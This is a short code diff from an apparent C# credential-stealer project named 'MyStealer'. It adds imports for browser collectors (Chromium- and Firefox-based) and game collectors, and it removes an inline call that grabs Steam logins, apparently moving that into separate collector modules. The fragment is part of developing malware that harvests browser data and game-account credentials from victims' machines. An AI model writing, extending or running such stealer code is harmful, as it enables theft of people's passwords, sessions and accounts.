@@ -1,4 +1,8 @@
-﻿using Serilog;
+﻿using MyStealer.Collector.Modules.Browser;
+using MyStealer.Collectors.Browser.ChromiumBased;
+using MyStealer.Collectors.Browser.FirefoxBased;
+using MyStealer.Collectors.Game;
+using Serilog;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -119,10 +123,6 @@ namespace MyStealer
                             browser.Dispose(); // Unload natives
                         }
                     }
-
-                    var st = new Steam();
-                    if (st.IsAvailable())
-                        st.GetLogins();
 
                     /* Cleanup */
 
